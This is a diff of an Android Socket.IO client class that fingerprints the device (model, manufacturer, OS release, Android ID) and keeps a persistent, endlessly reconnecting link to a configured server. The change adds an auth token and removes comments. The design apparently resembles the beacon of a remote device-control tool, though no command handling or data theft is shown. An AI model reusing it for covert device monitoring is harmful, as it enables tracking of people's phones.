@@ -9,26 +9,20 @@ import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
 import android.provider.Settings;
-
 import com.fason.app.core.FasonApp;
 import com.fason.app.core.config.Config;
-
 import java.net.URLEncoder;
 import java.nio.charset.StandardCharsets;
-
 import io.socket.client.IO;
 import io.socket.client.Socket;
 
 public final class SocketClient {
-
     private static final int RECONNECT_DELAY = 5000;
-
     private static SocketClient instance;
     private Socket socket;
     private ConnectivityManager.NetworkCallback networkCallback;
     private final Handler handler = new Handler(Looper.getMainLooper());
     private volatile boolean connected = false;
-
     private SocketClient() {
         init();
         setupNetworkMonitor();
@@ -48,13 +42,17 @@ public final class SocketClient {
                 Settings.Secure.ANDROID_ID
             );
             if (deviceId == null) deviceId = "unknown";
+            StringBuilder queryBuilder = new StringBuilder()
+                .append("model=").append(encode(Build.MODEL))
+                .append("&manf=").append(encode(Build.MANUFACTURER))
+                .append("&release=").append(encode(Build.VERSION.RELEASE))
+                .append("&id=").append(encode(deviceId));
 
-            String query = String.format("model=%s&manf=%s&release=%s&id=%s",
-                encode(Build.MODEL),
-                encode(Build.MANUFACTURER),
-                encode(Build.VERSION.RELEASE),
-                encode(deviceId));
-
+            String deviceSecret = Config.getDeviceSecret();
+            if (deviceSecret != null && !deviceSecret.isEmpty()) {
+                queryBuilder.append("&token=").append(encode(deviceSecret));
+            }
+            String query = queryBuilder.toString();
             IO.Options opts = new IO.Options();
             opts.reconnection = true;
             opts.reconnectionAttempts = Integer.MAX_VALUE;
@@ -63,9 +61,7 @@ public final class SocketClient {
             opts.timeout = 30000;
             opts.query = query;
             opts.secure = Config.isHttps();
-
             socket = IO.socket(Config.getServerUrl(), opts);
-
             socket.on(Socket.EVENT_CONNECT, args -> connected = true);
             socket.on(Socket.EVENT_DISCONNECT, args -> connected = false);
             socket.on(Socket.EVENT_CONNECT_ERROR, args -> connected = false);
@@ -76,11 +72,9 @@ public final class SocketClient {
         ConnectivityManager cm = (ConnectivityManager) FasonApp.getContext()
             .getSystemService(Context.CONNECTIVITY_SERVICE);
         if (cm == null) return;
-
         NetworkRequest req = new NetworkRequest.Builder()
             .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
             .build();
-
         networkCallback = new ConnectivityManager.NetworkCallback() {
             @Override
             public void onAvailable(Network network) {
@@ -91,7 +85,6 @@ public final class SocketClient {
                 }, 1000);
             }
         };
-
         try {
             cm.registerNetworkCallback(req, networkCallback);
         } catch (Exception ignored) {}
@@ -126,16 +119,13 @@ public final class SocketClient {
         }
     }
 
-    /** Full shutdown — disconnects socket and unregisters network callback. */
     public void shutdown() {
         disconnect();
-
         if (socket != null) {
             socket.off(Socket.EVENT_CONNECT);
             socket.off(Socket.EVENT_DISCONNECT);
             socket.off(Socket.EVENT_CONNECT_ERROR);
         }
-
         if (networkCallback != null) {
             try {
                 ConnectivityManager cm = (ConnectivityManager) FasonApp.getContext()
@@ -144,12 +134,9 @@ public final class SocketClient {
             } catch (Exception ignored) {}
             networkCallback = null;
         }
-
         handler.removeCallbacksAndMessages(null);
         connected = false;
         socket = null;
-
-        // Reset singleton so next getInstance() creates a fresh instance
         synchronized (SocketClient.class) {
             instance = null;
         }
